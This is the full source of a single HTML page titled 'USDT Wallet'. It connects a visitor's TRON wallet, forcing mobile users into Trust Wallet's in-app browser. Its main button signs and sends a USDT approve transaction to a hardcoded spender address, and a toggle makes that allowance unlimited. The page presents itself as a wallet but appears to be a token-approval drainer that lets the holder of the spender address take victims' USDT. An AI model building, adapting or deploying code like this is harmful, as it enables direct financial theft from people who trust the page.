<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>USDT Wallet</title>

<style>
body{background:#0b0f19;color:#fff;font-family:sans-serif;margin:0}
.container{max-width:420px;margin:auto;padding:16px}
.card{background:#121826;border-radius:16px;padding:16px;margin-top:16px}
.title{text-align:center;font-size:20px;margin-bottom:10px}
.wallet{color:#4ade80;font-size:13px;text-align:center}
button{width:100%;padding:14px;border:none;border-radius:12px;margin-top:10px;font-weight:600}
.connect{background:#3b82f6}
.approve{background:#22c55e}
.toggle{background:#333}
input{width:100%;padding:12px;border-radius:10px;border:none;margin-top:10px;background:#0f172a;color:white}
#qr{display:flex;justify-content:center;margin-top:10px}
.log{font-size:11px;background:#000;padding:10px;border-radius:10px;margin-top:10px;max-height:200px;overflow:auto}
</style>
</head>

<body>

<div class="container">

<div class="title">💰 USDT Wallet</div>

<div class="card">
  <div id="status">Initializing...</div>
  <div id="wallet" class="wallet"></div>
  <div id="qr"></div>
</div>

<div class="card">
  <div>Select Amount</div>

  <input type="range" id="range" min="1" max="1000" value="10">
  <input type="number" id="amount" value="10">

  <button id="unlimitedBtn" class="toggle">Unlimited: OFF</button>

  <button id="approveBtn" class="approve">Approve USDT</button>
</div>

<div class="card">
  <div>Logs</div>
  <div id="logs" class="log"></div>
</div>

</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>

<script type="module">
import bs58 from "https://esm.sh/bs58";

const PROJECT_ID = "171db6da15a54effc1b4a06f889a3c3f";
const TRON_CHAIN = "tron:0x2b6653dc";
const TRONGRID = "https://api.trongrid.io";

const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const SPENDER = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";

let client, session, wallet;
let unlimited = false;

// helpers
function log(msg){
  document.getElementById("logs").innerText += msg + "\n";
}

function isMobile(){
  return /Android|iPhone|iPad/i.test(navigator.userAgent);
}

// redirect to wallet (mobile)
function openWallet(){
  window.location.href =
    "https://link.trustwallet.com/open_url?url=" +
    encodeURIComponent(window.location.href);
}

// tron hex
function tronToHex(addr){
  const bytes = bs58.decode(addr);
  return Array.from(bytes).map(b=>b.toString(16).padStart(2,"0")).join("").slice(0,42);
}

// encode approve
function encodeApprove(spenderHex, amount){
  const clean = spenderHex.replace(/^41/,"").padStart(64,"0");

  let amountHex;

  if(unlimited){
    amountHex = "f".repeat(64);
  } else {
    const val = BigInt(Math.floor(amount * 1e6));
    amountHex = val.toString(16).padStart(64,"0");
  }

  return "095ea7b3" + clean + amountHex;
}

// UI sync
const range = document.getElementById("range");
const input = document.getElementById("amount");

range.oninput = ()=> input.value = range.value;
input.oninput = ()=> range.value = input.value;

// unlimited toggle
document.getElementById("unlimitedBtn").onclick = ()=>{
  unlimited = !unlimited;
  document.getElementById("unlimitedBtn").innerText =
    "Unlimited: " + (unlimited ? "ON" : "OFF");
};

// 🔥 MOBILE CONNECT (tronWeb)
async function mobileConnect(){
  if(window.tronWeb && window.tronWeb.defaultAddress.base58){
    wallet = window.tronWeb.defaultAddress.base58;
    document.getElementById("wallet").innerText = wallet;
    document.getElementById("status").innerText = "Connected (Mobile)";
    return true;
  }
  return false;
}

// 🔥 DESKTOP CONNECT (your WalletConnect flow)
async function desktopConnect(){
  const { SignClient } = await import("https://esm.sh/@walletconnect/sign-client@2.17.0");

  client = await SignClient.init({
    projectId: PROJECT_ID,
    metadata:{
      name:"USDT Wallet",
      description:"dapp",
      url:location.origin,
      icons:[""]
    }
  });

  const { uri, approval } = await client.connect({
    requiredNamespaces:{
      tron:{
        methods:["tron_signTransaction"], // keep your flow
        chains:[TRON_CHAIN],
        events:[]
      }
    }
  });

  new QRCode(document.getElementById("qr"), {
    text: uri,
    width:200,
    height:200
  });

  session = await approval();

  wallet = session.namespaces.tron.accounts[0].split(":")[2];

  document.getElementById("wallet").innerText = wallet;
  document.getElementById("status").innerText = "Connected (Desktop)";
}

// approve
document.getElementById("approveBtn").onclick = async ()=>{
  try{
    const amount = Number(input.value);
    const value = unlimited
      ? "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
      : Math.floor(amount * 1e6);

    // ✅ MOBILE (perfect flow)
    if(window.tronWeb && wallet){
      const tx = await window.tronWeb.transactionBuilder.triggerSmartContract(
        USDT,
        "approve(address,uint256)",
        {},
        [
          {type:"address", value: SPENDER},
          {type:"uint256", value: value}
        ],
        wallet
      );

      const signed = await window.tronWeb.trx.sign(tx.transaction);
      const result = await window.tronWeb.trx.sendRawTransaction(signed);

      log("MOBILE RESULT:\n" + JSON.stringify(result,null,2));
      document.getElementById("status").innerText = "✅ Success";
      return;
    }

    // ⚠️ Desktop fallback (limited)
    throw "Desktop approve via WalletConnect not reliable";

  }catch(e){
    log("ERROR:\n" + e);
    document.getElementById("status").innerText = "❌ Failed";
  }
};

// 🚀 INIT
(async ()=>{
  document.getElementById("status").innerText = "Connecting...";

  if(isMobile()){
    const ok = await mobileConnect();

    if(!ok){
      openWallet(); // force open wallet
      return;
    }
  } else {
    await desktopConnect();
  }
})();
</script>

</body>
</html>
